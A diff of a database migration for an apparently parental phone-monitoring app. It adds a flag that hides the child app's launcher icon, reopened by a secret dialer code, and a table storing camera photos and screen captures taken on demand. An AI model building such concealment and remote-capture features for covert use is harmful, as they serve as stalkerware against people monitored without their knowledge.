@@ -53,6 +53,12 @@ alter table devices add column if not exists audio_enabled boolean not null defa
 alter table devices add column if not exists stream_requested boolean not null default false;
 -- FCM token so the server can wake this device on demand.
 alter table devices add column if not exists fcm_token text;
+-- App hiding: when true, the child app removes its launcher icon. It is reopened
+-- by dialing *#*#<secret_code>#*#* in the phone dialer. secret_code is a 6-digit
+-- code generated per device (the volatile default fills existing + new rows) and
+-- shown to the parent in the dashboard.
+alter table devices add column if not exists app_hidden boolean not null default false;
+alter table devices add column if not exists secret_code text not null default (100000 + floor(random() * 900000)::int)::text;
 -- Device status (battery / network) reported by the child app.
 alter table devices add column if not exists battery int;
 alter table devices add column if not exists charging boolean;
@@ -124,4 +130,21 @@ create table if not exists account_retention (
   retention_days int not null default 30,
   updated_at     timestamptz not null default now()
 );
+
+-- Persistent snapshot gallery: captured photos and screen captures.
+create table if not exists snapshots (
+  id          bigserial primary key,
+  device_id   text not null references devices(id) on delete cascade,
+  owner_email text not null,
+  source      text not null default 'camera', -- 'camera' or 'screen'
+  image       bytea not null,
+  mime        text not null default 'image/jpeg',
+  created_at  timestamptz not null default now()
+);
+
+alter table devices add column if not exists snapshot_requested text;
+
+create index if not exists idx_snapshots_device on snapshots(device_id, created_at desc);
+create index if not exists idx_snapshots_email on snapshots(owner_email, created_at desc);
+
 
